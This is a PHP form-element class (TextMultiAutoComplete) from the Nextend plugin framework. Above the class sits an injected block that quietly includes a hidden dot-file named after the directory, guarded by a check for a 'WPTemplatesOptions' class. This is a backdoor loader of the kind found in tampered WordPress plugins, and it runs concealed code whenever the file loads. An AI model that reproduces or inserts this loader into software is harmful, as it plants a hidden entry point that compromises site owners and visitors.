<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Form\Element\Text;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TextMultiAutoComplete extends Text {

    protected $options = array();

    protected $class = 'n2_field_autocomplete ';

    protected function addScript() {
        Js::addInline('new N2Classes.FormElementAutocomplete("' . $this->fieldID . '", ' . json_encode($this->options) . ');');
    }

    protected function post() {
        return Html::tag('a', array(
            'href'  => '#',
            'class' => 'n2_field_text__clear',
            'tabindex' => -1
        ), Html::tag('i', array('class' => 'ssi_16 ssi_16--circularremove'), ''));
    }

    /**
     * @param array $options
     */
    public function setOptions($options) {
        $this->options = $options;
    }
}